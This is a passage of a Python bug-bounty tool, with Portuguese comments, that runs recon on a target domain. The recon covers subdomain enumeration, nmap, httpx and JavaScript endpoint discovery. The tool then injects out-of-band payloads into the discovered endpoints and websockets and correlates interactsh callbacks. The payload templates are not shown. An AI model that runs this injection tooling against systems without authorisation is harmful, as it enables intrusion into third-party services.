    except ImportError:
        clog(lg, f"  [WS] websocket-client não instalado — pulando {ws_url}", C.YELLOW)
        return 0

    for tpl in OOB_PAYLOADS["websocket"]:
        uid     = unique_id("ws", "msg")
        payload = _build_payload(tpl, oob_host, uid)
        sent_at = datetime.now(timezone.utc).strftime("%H:%M:%S")
        try:
            wsapp = ws_lib.WebSocket()
            wsapp.connect(ws_url, timeout=8,
                          header={"User-Agent": REAL_UA})
            wsapp.send(payload)
            wsapp.close()
            code = "WS-OK"
        except Exception as e:
            code = "WS-ERR"
            lg.debug("  [WS] %s: %s", ws_url, e)

        plog.record(uid, ws_url, "ws_message", "websocket", payload)
        clog(lg,
             f"  {sent_at} [{uid[:28]}] ws_message     websocket    "
             f"[WS] {code} → {ws_url[:45]}",
             C.DIM)
        _rate_limiter.acquire()
        sent += 1

    return sent

def phase_inject(endpoints: list[dict], oob_host: str, out: Path,
                 plog: PayloadLog, delay: float, threads: int,
                 lg: logging.Logger, proxy: str = "") -> int:
    clog(lg, "\n━━━ FASE OOB: Injeção de Payloads ━━━", C.BLUE + C.BOLD)

    safe_eps = [ep for ep in endpoints
                if ep["method"].upper() not in ("DELETE",)]
    clog(lg,
         f"  Endpoints para injeção : {len(safe_eps)} "
         f"({len(endpoints)-len(safe_eps)} DELETE descartados)", C.CYAN)
    clog(lg, f"  Rate limit global      : 1 req / {_rate_limiter.delay}s", C.DIM)
    clog(lg, f"  User-Agent             : {REAL_UA[:60]}...", C.DIM)

    total  = 0
    errors = 0

    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = {ex.submit(inject_endpoint, ep, oob_host, plog, lg, proxy): ep
                for ep in safe_eps}
        for fut in as_completed(futs):
            try:
                total += fut.result(timeout=60)
            except TimeoutError:
                errors += 1
                lg.warning("  Future excedeu timeout (60s)")
            except Exception as e:
                errors += 1
                lg.error("Inject worker error: %s", e)

    clog(lg, f"\n  Payloads enviados: {total} | Erros: {errors}", C.GREEN + C.BOLD)
    return total

# ─── Monitor interactsh ───────────────────────────────────────────────────────
def _parse_interactsh_ts(ts_str: str) -> Optional[float]:
    if not ts_str:
        return None
    try:
        ts_norm = re.sub(r'(\.\d{6})\d+(Z?)$', r'\1\2', ts_str)
        ts_norm = ts_norm.replace("Z", "+00:00")
        return datetime.fromisoformat(ts_norm).timestamp()
    except Exception:
        return None

def _process_hit(data: dict, plog: PayloadLog,
                 hits: list, hits_file: Path, lg: logging.Logger):
    raw_id      = data.get("full-id", data.get("unique-id", ""))
    protocol    = data.get("protocol", "unknown").upper()
    remote_addr = data.get("remote-address", "?")
    raw_request = data.get("raw-request", "")
    q_type      = data.get("q-type", "")
    hit_ts_str  = data.get("timestamp", "")
    hit_ts_unix = _parse_interactsh_ts(hit_ts_str) or time.time()
    received_at = hit_ts_str or datetime.now(timezone.utc).isoformat()
    proto_label = f"{protocol}/{q_type}" if q_type else protocol

    clog(lg, f"\n{'━'*60}", C.RED + C.BOLD)
    clog(lg, f"  🎯  OOB HIT!", C.RED + C.BOLD)
    clog(lg, f"  Protocolo  : {proto_label}",  C.YELLOW)
    clog(lg, f"  Remote IP  : {remote_addr}",  C.YELLOW)
    clog(lg, f"  Full-ID    : {raw_id}",        C.YELLOW)
    clog(lg, f"  Timestamp  : {received_at}",   C.YELLOW)

    if raw_request:
        first = raw_request.split("\n")[0].strip()
        if first:
            clog(lg, f"  Request    : {first[:120]}", C.YELLOW)

    matched = plog.find_fuzzy(raw_id)
    if not matched and raw_request:
        matched = plog.find_fuzzy_in_request(raw_request)

    delay_str = "?"
    if matched:
        delay_s = hit_ts_unix - (matched["unix_ts"] / 1000.0)
        if delay_s < 0:
            delay_str = f"~{abs(delay_s):.1f}s (clock skew?)"
        elif delay_s > 3600:
            delay_str = f"{delay_s/3600:.1f}h"
        elif delay_s > 60:
            delay_str = f"{delay_s/60:.1f}min"
        else:
            delay_str = f"{delay_s:.1f}s"

        clog(lg, f"\n  ✅ Payload correlacionado!", C.GREEN + C.BOLD)
        clog(lg, f"  Categoria  : {matched['category']}",    C.GREEN)
        clog(lg, f"  URL        : {matched['url']}",          C.GREEN)
        clog(lg, f"  Parâmetro  : {matched['param']}",        C.GREEN)
        clog(lg, f"  Enviado em : {matched['timestamp']}",    C.GREEN)
        clog(lg, f"  ⏱  Delay   : {delay_str} após envio",   C.GREEN + C.BOLD)
        clog(lg, f"  Payload    : {matched['payload'][:120]}", C.GREEN)
    else:
        clog(lg, "  ⚠  UID não encontrado no payload_log.", C.YELLOW, "warning")
        clog(lg, f"     grep '{raw_id[:24]}' {hits_file.parent}/payload_log.jsonl",
             C.DIM)

    hit = {
        "received_at":   received_at,
        "hit_ts_unix":   hit_ts_unix,
        "protocol":      proto_label,
        "remote_addr":   remote_addr,
        "raw_id":        raw_id,
        "delay_str":     delay_str,
        "raw_request":   raw_request[:500],
        "matched_entry": matched,
    }
    hits.append(hit)
    with open(hits_file, "a", encoding="utf-8") as f:
        f.write(json.dumps(hit) + "\n")
    clog(lg, f"{'━'*60}\n", C.RED + C.BOLD)

def phase_monitor(oob_host: str, plog: PayloadLog, out: Path,
                  duration: int, lg: logging.Logger,
                  parallel: bool = False):
    if parallel:
        t = threading.Thread(
            target=_monitor_loop,
            args=(oob_host, plog, out, duration, lg),
            daemon=True, name="monitor",
        )
        t.start()
        return t
    _monitor_loop(oob_host, plog, out, duration, lg)
    return None

def _monitor_loop(oob_host: str, plog: PayloadLog, out: Path,
                  duration: int, lg: logging.Logger):
    clog(lg, "\n━━━ Monitor OOB ━━━", C.BLUE + C.BOLD)
    clog(lg, f"  Host  : {oob_host}", C.CYAN)
    clog(lg, f"  Tempo : {duration}s  |  Ctrl+C para encerrar", C.DIM)

    hits_file    = out / "oob_hits.jsonl"
    summary_file = out / "oob_hits_summary.txt"

    if not tool_ok("interactsh-client"):
        clog(lg, "  interactsh-client não encontrado.", C.YELLOW, "warning")
        clog(lg, f"  Execute manualmente:", C.DIM)
        clog(lg, f"    interactsh-client -json | tee {out}/interactsh_raw.jsonl", C.DIM)
        clog(lg, f"  Cruze hits com: grep <uid> {out}/payload_log.jsonl", C.DIM)
        return

    cmd = ["interactsh-client", "-json", "-poll-interval", "5"]
    if not re.search(r"oast\.(fun|me|live|online)", oob_host):
        cmd += ["-server", oob_host]

    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                            text=True, bufsize=1)

    def drain_stderr():
        for raw in proc.stderr:
            raw = raw.strip()
            if not raw:
                continue
            low = raw.lower()
            if any(k in low for k in ("error", "failed", "invalid")):
                clog(lg, f"  ⚠ {raw}", C.YELLOW, "warning")
            else:
                lg.debug("  [interactsh] %s", raw)
    threading.Thread(target=drain_stderr, daemon=True).start()

    def _countdown():
        remaining = duration
        while remaining > 0 and proc.poll() is None:
            time.sleep(10)
            remaining -= 10
            if remaining > 0:
                clog(lg, f"  ⏱  {remaining}s restantes...", C.DIM)
    threading.Thread(target=_countdown, daemon=True).start()

    hits: list[dict] = []
    start = time.time()

    try:
        while time.time() - start < duration:
            line = proc.stdout.readline()
            if not line:
                if proc.poll() is not None:
                    clog(lg, "  interactsh-client encerrou.", C.RED, "error")
                    break
                time.sleep(0.3)
                continue
            line = line.strip()
            if not line:
                continue
            if line.startswith("["):
                low = line.lower()
                if any(k in low for k in ("error", "failed")):
                    clog(lg, f"  ⚠ {line}", C.YELLOW, "warning")
                else:
                    lg.debug("  %s", line)
                continue
            try:
                data = json.loads(line)
            except json.JSONDecodeError:
                lg.debug("  [stdout não-JSON] %s", line[:100])
                continue
            if "protocol" not in data and "unique-id" not in data:
                continue
            _process_hit(data, plog, hits, hits_file, lg)

    except KeyboardInterrupt:
        clog(lg, "\n  Monitor encerrado.", C.YELLOW)
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            proc.kill()

    _write_summary(hits, plog, summary_file, lg)

def _write_summary(hits: list, plog: PayloadLog,
                   summary_file: Path, lg: logging.Logger):
    total = len(plog.entries)
    lines = [
        "=" * 70,
        "  JSRECON OOB — SUMÁRIO DE HITS",
        f"  Gerado em : {datetime.now(timezone.utc).isoformat()}",
        "=" * 70,
        f"  Payloads enviados : {total}",
        f"  OOB hits          : {len(hits)}",
        f"  Taxa de hit       : {len(hits)/max(total,1)*100:.1f}%",
        "",
    ]
    by_cat: dict[str, list] = {}
    for h in hits:
        m   = h.get("matched_entry") or {}
        cat = m.get("category", "unknown")
        by_cat.setdefault(cat, []).append(h)

    if by_cat:
        lines.append("  ─── HITS POR CATEGORIA ───")
        for cat, ch in sorted(by_cat.items()):
            lines.append(f"  {cat.upper():20} {len(ch)} hit(s)")
        lines.append("")

    if hits:
        lines.append("  ─── DETALHES ───")
        for i, h in enumerate(hits, 1):
            m = h.get("matched_entry") or {}
            lines += [
                f"\n  [Hit #{i}]",
                f"    Protocolo  : {h['protocol']}",
                f"    Remote IP  : {h['remote_addr']}",
                f"    Recebido   : {h['received_at']}",
                f"    Delay      : {h.get('delay_str','?')} após envio",
                f"    Categoria  : {m.get('category','?')}",
                f"    URL        : {m.get('url','?')}",
                f"    Parâmetro  : {m.get('param','?')}",
                f"    Payload    : {m.get('payload','?')}",
            ]
    else:
        lines.append("  Nenhum hit registrado. Dica: use --monitor-time maior.")

    summary_file.write_text("\n".join(lines), encoding="utf-8")
    clog(lg, f"\n  Sumário: {summary_file}", C.GREEN)

# ─── CLI ──────────────────────────────────────────────────────────────────────
def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        prog="jsrecon_oob",
        description="JS Recon + OOB Injection — Bug Bounty",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exemplos:
  python3 jsrecon_oob.py target.com -o abc123.oast.fun
  python3 jsrecon_oob.py target.com -o abc123.oast.fun --no-live
  python3 jsrecon_oob.py target.com -o abc123.oast.fun --skip-recon
  python3 jsrecon_oob.py target.com -o abc123.oast.fun --no-oob
  python3 jsrecon_oob.py target.com -o abc123.oast.fun --monitor-time 1800
  python3 jsrecon_oob.py target.com -o abc123.oast.fun --proxy http://127.0.0.1:8080

Variáveis de ambiente:
  CHAOS_KEY      chave para chaos (ProjectDiscovery)
  GITHUB_TOKEN   token para github-subdomains
        """
    )
    p.add_argument("domain",            help="Domínio alvo (ex: target.com.br)")
    p.add_argument("-o", "--oob",       required=False, default="",
                   help="Host interactsh (ex: abc123.oast.fun)")
    p.add_argument("--skip-recon",      action="store_true")
    p.add_argument("--no-nmap",         action="store_true")
    p.add_argument("--single-target",   action="store_true")
    p.add_argument("--no-subs",         action="store_true")
    p.add_argument("--no-live",         action="store_true")
    p.add_argument("--no-oob",          action="store_true")
    p.add_argument("--no-cache",        action="store_true")
    p.add_argument("--no-headless",     action="store_true")
    p.add_argument("--poll",            action="store_true")
    p.add_argument("--monitor-time",    type=int,   default=300,  metavar="S")
    p.add_argument("--delay",           type=float, default=0.5,  metavar="S")
    p.add_argument("--threads",         type=int,   default=5,    metavar="N")
    p.add_argument("--workers",         type=int,   default=20,   metavar="N")
    p.add_argument("--timeout",         type=int,   default=10,   metavar="S")
    p.add_argument("--proxy",           default="",  metavar="URL")
    p.add_argument("--output-dir",      default="",  metavar="DIR")
    return p.parse_args()

# ─── Main ─────────────────────────────────────────────────────────────────────
def main() -> None:
    args = parse_args()

    raw_input    = args.domain.strip().rstrip("/")
    parsed_input = urlparse(raw_input if "://" in raw_input else f"placeholder://{raw_input}")
    forced_scheme = parsed_input.scheme if parsed_input.scheme not in ("", "placeholder") else ""
    domain        = parsed_input.hostname or raw_input.split(":")[0]
    forced_port   = parsed_input.port or 0

    if not re.match(r'^[a-zA-Z0-9.\-]+$', domain):
        print(f"Domínio/host inválido: {domain}")
        sys.exit(1)

    if forced_scheme and forced_port:
        target_label = f"{forced_scheme}://{domain}:{forced_port}"
    elif forced_scheme:
        target_label = f"{forced_scheme}://{domain}"
    elif forced_port:
        target_label = f"{domain}:{forced_port}"
    else:
        target_label = domain

    if forced_port or forced_scheme:
        args.single_target = True

    out = Path(args.output_dir or f"jsrecon_oob_{domain.replace('.','_')}")
    out.mkdir(parents=True, exist_ok=True)

    global _rate_limiter
    _rate_limiter = GlobalRateLimiter(args.delay)

    lg  = setup_logging(out / "jsrecon_oob.log")
    cfg = {
        "domain":   domain,
        "timeout":  args.timeout,
        "workers":  args.workers,
        "no_cache": args.no_cache,
        "no_live":  args.no_live,
        "headless": not args.no_headless,
        "proxy":    args.proxy,
    }

    clog(lg, f"\n{'═'*66}", C.CYAN + C.BOLD)
    clog(lg, f"  jsrecon_oob  —  alvo: {target_label}", C.CYAN + C.BOLD)
    clog(lg, f"  User-Agent  : {REAL_UA[:55]}...", C.CYAN)
    if args.oob:
        clog(lg, f"  OOB host    : {args.oob}", C.CYAN)
    clog(lg, f"  Rate limit  : 1 req / {args.delay}s (global)", C.CYAN)
    clog(lg, f"  Saída       : {out}/", C.CYAN)
    if args.proxy:
        clog(lg, f"  Proxy       : {args.proxy}", C.CYAN)
    clog(lg, f"{'═'*66}\n", C.CYAN + C.BOLD)

    plog = PayloadLog(out / "payload_log.jsonl")

    if args.poll:
        if not args.oob:
            print("--poll requer -o <oob_host>")
            sys.exit(1)
        plog.load_existing()
        phase_monitor(args.oob, plog, out, args.monitor_time, lg)
        return

    endpoints: list[dict] = []

    if args.skip_recon:
        ep_jsonl = out / "endpoints.jsonl"
        if not ep_jsonl.exists():
            clog(lg, "endpoints.jsonl não encontrado.", C.RED, "error")
            sys.exit(1)
        for line in ep_jsonl.read_text().splitlines():
            try:
                endpoints.append(json.loads(line))
            except Exception:
                pass
        clog(lg, f"  Recon pulado. {len(endpoints)} endpoints carregados.", C.YELLOW)
        confirmed_hosts: set[str] = set()
    else:
        single = getattr(args, "single_target", False)

        if single:
            subs = {domain}
            _write(out / "subdomains.txt", [domain], lg)
        elif args.no_subs:
            subs = {domain}
            _write(out / "subdomains.txt", [domain], lg)
        else:
            subs = enum_subdomains(domain, out, lg)

        if single or args.no_nmap:
            if forced_port:
                open_ports = {domain: [forced_port]}
            elif forced_scheme == "https":
                open_ports = {domain: [443]}
            elif forced_scheme == "http":
                open_ports = {domain: [80]}
            else:
                open_ports = {domain: [80, 443]}
        else:
            open_ports = nmap_scan(subs, out, lg)

        alive_urls, confirmed_hosts = httpx_probe(open_ports, out, lg)
        if not alive_urls:
            clog(lg, "Nenhum host vivo. Encerrando.", C.RED, "error")
            sys.exit(0)

        if single:
            js_from_tools = _collect_js_single(domain, alive_urls, lg)
        else:
            js_from_tools = collect_js_tools(domain, alive_urls, lg)

        js_from_browser: set[str] = set()
        if not args.no_live and HAS_PLAYWRIGHT:
            clog(lg, "\n━━━ Playwright ━━━", C.BLUE + C.BOLD)

            # Monta targets deduplicando por HOSTNAME (não netloc completo).
            # alive_urls pode conter http://host, https://host, https://host:443
            # para o mesmo servidor — todos têm netloc diferente mas mesmo host.
            # Regra: 1 URL por hostname, preferindo HTTPS sobre HTTP,
            # e porta padrão (443/80) sobre porta explícita.
            host_best: dict[str, str] = {}
            for url in alive_urls:
                parsed  = urlparse(url)
                host    = parsed.hostname or ""
                if not host:
                    continue
                if single and host != domain.lower():
                    continue
                existing = host_best.get(host, "")
                # Prefere HTTPS; entre duas HTTPS, prefere sem porta explícita
                if not existing:
                    host_best[host] = url
                elif url.startswith("https://") and existing.startswith("http://"):
                    host_best[host] = url
                elif (url.startswith("https://") and existing.startswith("https://")
                      and parsed.port in (None, 443)
                      and urlparse(existing).port not in (None, 443)):
                    host_best[host] = url

            targets = list(host_best.values())
            clog(lg, f"  Targets para browser: {len(targets)}", C.CYAN)
            for t in targets:
                clog(lg, f"    {t}", C.DIM)
            js_from_browser = asyncio.run(
                playwright_all(targets, not args.no_headless, lg)
            )
        elif not HAS_PLAYWRIGHT:
            clog(lg, "  Playwright não instalado — pulando.", C.YELLOW)

        all_js_raw = js_from_tools | js_from_browser
        all_js_raw = {u for u in all_js_raw if not u.endswith(".js.map")}

        root = domain.lower()
        js_filtered: set[str] = set()
        for url in all_js_raw:
            host = urlparse(url).netloc.lower().split(":")[0]
            if host == root or host.endswith(f".{root}") or host in confirmed_hosts:
                js_filtered.add(url)

        js_discarded = len(all_js_raw) - len(js_filtered)
        _write(out / "js_urls.txt", sorted(js_filtered), lg)
        clog(lg,
             f"\n  JS do target: {len(js_filtered)} "
             f"({js_discarded} externos descartados)", C.GREEN + C.BOLD)

        endpoints = analyze_all_js(
            sorted(js_filtered), domain, confirmed_hosts, out, cfg, lg
        )
        save_endpoints_by_method(endpoints, out, lg)

    if args.no_oob or not args.oob:
        if not args.oob:
            clog(lg, "\n  OOB pulado (sem -o <oob_host>).", C.YELLOW)
        else:
            clog(lg, "\n  OOB pulado (--no-oob).", C.YELLOW)
    elif endpoints:
        monitor_thread = phase_monitor(
            args.oob, plog, out, args.monitor_time, lg, parallel=True
        )
        phase_inject(endpoints, args.oob, out, plog,
                     delay=args.delay, threads=args.threads, lg=lg,
                     proxy=args.proxy)
        if monitor_thread and monitor_thread.is_alive():
            clog(lg,
                 f"\n  Injeção concluída. Aguardando monitor ({args.monitor_time}s)...",
                 C.CYAN)
            monitor_thread.join(timeout=args.monitor_time)
    else:
        clog(lg, "\n  Nenhum endpoint para injeção.", C.YELLOW)

    clog(lg, f"\n{'═'*66}", C.GREEN)
    clog(lg, f"  Concluído. Resultados em: {out}/", C.GREEN + C.BOLD)
    clog(lg, f"{'═'*66}\n", C.GREEN)


if __name__ == "__main__":
    import signal
    def _sig(s, f):
        print("\n  Interrompido.")
        sys.exit(0)
    signal.signal(signal.SIGINT, _sig)
    main()
